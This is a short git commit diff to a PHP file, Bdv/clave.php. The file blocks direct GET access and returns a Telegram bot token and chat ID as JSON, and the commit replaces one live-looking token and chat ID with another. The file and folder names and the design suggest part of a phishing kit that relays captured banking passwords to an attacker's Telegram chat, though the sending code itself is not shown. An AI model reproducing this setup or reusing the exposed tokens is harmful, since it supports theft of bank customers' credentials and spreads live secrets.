2da7a7c8a8295efa8f8f14fb394300d59657c622
Livedave03 <lopelquelop@gmail.com>
2024-10-14 08:03:19 -0500

    Update clave.php

--- Bdv/clave.php
+++ Bdv/clave.php
@@ -1,6 +1,14 @@
 <?php
+    // Verifica si el script está siendo accedido directamente
+    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
+        // Redirige a index.html si se intenta acceder directamente
+        header('Location: index.html');
+        exit(); // Detiene la ejecución del script
+    }
+
+    // Continúa con el código si no es acceso directo
     header('Content-Type: application/json');
-    $botToken = '6581443251:AAELPlQyJtJzs8AdiNaEKNPMxKPy4v1AFmM';
-    $chatId = '6396229862';
+    $botToken = '7801786395:AAFcOkQcB3RKgJZGA_qYVjOQknd_haW_lbE';
+    $chatId = '5391753542';
     echo json_encode(['botToken' => $botToken, 'chatId' => $chatId]);
 ?>
